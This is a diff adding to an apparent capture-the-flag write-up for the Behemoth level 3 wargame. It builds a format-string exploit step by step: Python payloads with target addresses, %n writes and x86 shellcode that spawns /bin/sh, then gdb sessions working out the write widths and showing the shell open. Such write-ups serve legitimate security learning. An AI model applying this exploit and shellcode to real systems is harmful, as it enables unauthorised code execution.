@@ -362,4 +362,48 @@ process 21053 is executing new program: /bin/dash
 [Inferior 1 (process 21053) exited normally]
 ```
 
-Well, it sure does look like it should be working.  More debugging to do.
+After much pain and gnashing of teeth I found something that would work.  I ended up actually switching out the shellcode.  Our address for the return is now at ```0xffffd62c``` and our shellcode is at ```0xffffd574```.
+
+```
+behemoth3@melinda:/tmp/tmp.yY7LmGZNQr$ python -c 'print "\x2c\xd6\xff\xffJUNK\x2d\xd6\xff\xffJUNK\x2e\xd6\xff\xffJUNK\x2f\xd6\xff\xff"+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"%x"*4+"%8x%n"' > input
+```
+```
+(gdb) run < input
+Starting program: /games/behemoth/behemoth3 < input
+Identify yourself: Welcome, ,���JUNK-���JUNK.���JUNK/���1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
+     c8f7fcac2000f7ffd000
+
+aaaand goodbye again.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000067 in ?? ()
+(gdb) p 0x74 - 0x67 + 8
+$1 = 21
+(gdb) p 0xd5 - 0x74
+$2 = 97
+(gdb) p 0xff - 0xd5
+$3 = 42
+(gdb) p 0x1ff - 0xff
+$4 = 256
+```
+```
+behemoth3@melinda:/tmp/tmp.yY7LmGZNQr$ python -c 'print "\x2c\xd6\xff\xffJUNK\x2d\xd6\xff\xffJUNK\x2e\xd6\xff\xffJUNK\x2f\xd6\xff\xff"+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"%x"*4+"%21x%n%97x%n%42x%n%256x%n"' > input
+```
+```
+behemoth3@melinda:/behemoth$ gdb behemoth3
+(gdb) run < input
+Starting program: /games/behemoth/behemoth3 < input
+/bin/bash: input: No such file or directory
+During startup program exited with code 1.
+(gdb) run < /tmp/tmp.yY7LmGZNQr/input
+Starting program: /games/behemoth/behemoth3 < /tmp/tmp.yY7LmGZNQr/input
+Identify yourself: Welcome, ,���JUNK-���JUNK.���JUNK/���1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
+     c8f7fcac2000             f7ffd000                                                                                         4b4e554a                                  4b4e554a                                                                                                                                                                                                                                                        4b4e554a
+
+aaaand goodbye again.
+process 4305 is executing new program: /bin/dash
+$ exit
+[Inferior 1 (process 4305) exited normally]
+```
+
+TODO
